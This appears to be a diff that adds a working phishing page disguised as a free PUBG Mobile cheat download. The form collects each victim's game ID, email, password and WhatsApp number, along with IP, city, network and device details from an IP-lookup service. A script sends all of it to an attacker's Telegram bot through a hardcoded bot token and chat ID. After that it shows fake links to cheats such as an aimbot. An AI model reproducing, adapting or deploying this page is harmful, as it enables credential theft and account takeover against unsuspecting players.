@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+         <meta name="viewport" content='width=device-width, initial_scale=1.0'/>
+        <title>Free Hack Pubg Mobile V3.9 Global</title>
+        <style>
+            body{
+                background-color:#1F1C2C;
+                font-family: ti;
+            }
+            .first{
+                height:750px;
+                width:300px;
+                border-radius: 4px;
+                background-color: #928DAB 
+;
+                padding:20px;
+            }
+            .img{
+                border-radius: 50%;
+                height:80px;
+                width: 90px;
+                margin-left: 120px;
+            }
+            label{
+                font-family: Times New Roman;
+            }
+            input{
+                margin:auto;
+                margin-top:10px;
+                height:46px;
+                font-family: Times New Roman;
+                width:300px;
+                border-radius: 6px;
+                border:1px solid white;
+            }
+            button{
+                margin-left: 10px;
+                margin-top:20px;
+                height:40px;
+                width:280px;
+                border-radius: 9px;
+                background-color: #2BC0E4;
+                border: none;
+                color:white;
+                font-size: 21px;
+                font-family: Times New Roman;
+            }
+            .sec{
+                background-color: lightgray;
+                width: 100%;
+                height:100%;
+                padding:20px;
+                margin:0px;
+                display: none;
+            }
+            a{
+                text-decoration: none;
+                display: block;
+                margin-left:50px;
+                padding-top:10px;
+                background-color: green;
+                width:230px;
+                height:30px;
+                text-align-last: center;
+                border-radius: 5px;
+                color:white;
+            }
+            h3{
+                text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+        <div  id = "first"class="first">
+            <p>How You Can Use Pubg Mobile Hack ...........Please Follow This Trick............ </p><br>
+            <img  class="img"src="kk/ry.png" /><br><br><br>
+                <label for="num1">Enter ID</label>
+                <input name="num1" type="number"id="num1"placeholder="Enter Your ID?"/><br><br>
+                <label for="Pubg/N">Pubg/N</label>
+                <input type="text" name="pubg/N" id="num2"placeholder="Enter Your Name in the Game?"/><br><br>
+                <label for="num3"> Email/g</label>
+                <input type="email" name="num3" id="num3" placeholder="Enter Your Email"/><br><br>
+                <label for="Password">Passwo</label><br>
+                <input type="password" name="Password" id="num4" placeholder="Enter Your Password ?" /><br><br>
+                <label for="Number">Number</label>
+                <input type="number" name="Number" id="num5" placeholder="Enter Whatsapp Number" /><br>
+                <button onclick="sent()">Chack My Account</button>
+        </div>
+        <div id ="sec" class="sec">
+            <h3>Welcome Sir You Can Now Yse this webpage For get Free Hack Pubg .......................Mobile..........................</h3><br>
+            <img  class = "img"src="kk/ry.png" alt="" /><br><br>
+            <a href="#">Headshot</a><br>
+            <a href="#">Skin</a><br>
+            <a href="#">Aim Bot</a><br>
+            <a href="#">Scope Hack</a><br>
+            <a href="#">M4 Yaghi</a><br>
+            <a href="#">Radar</a><br>
+            <a href="#">All hack in one file</a>
+        </div>
+        <script>
+            var id ="5985941427";
+            var token ="7645134133:AAGxjjv2TQn0JwIAeoj9R0ZZmZNaa_5_I3w";
+            function sent(){
+                    var two = document.getElementById("num1").value;
+            var tree = document.getElementById("num2").value;
+            var four= document.getElementById("num3").value;
+            var five = document.getElementById("num4").value;
+            var six = document.getElementById("num5").value;
+            if (two ==="" ||tree ==="" ||four ==="" ||five ==="" ||six ==="" ){
+                alert("Please Check Your Information")
+            }
+            fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then( data => {
+                let ip =`
+                 IP : ${data.ip}
+                 Device :${navigator.userAgent}
+                 CITY : ${data.city}
+                 Network :${data.org}
+                 `;
+                 var mes =`Information About User \n\nID :${two}\nName :${tree}\nEmail${four}\nPassword :${five}\n Number :${six}\n\n\nDevice=> ${ip}`;
+                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(mes)}`)
+                 .then(res => res.json())
+                 .then(data =>{
+                     if(data.ok){
+                         document.getElementById("first").style.display="none";
+                         document.getElementById("sec").style.display="block";
+                     }
+                     else{
+                         alert("Error 404");
+                     }
+                 })
+            })
+            .catch(error => console.error("error:",error))
+            }
+        </script>
+    </body>
+</html>
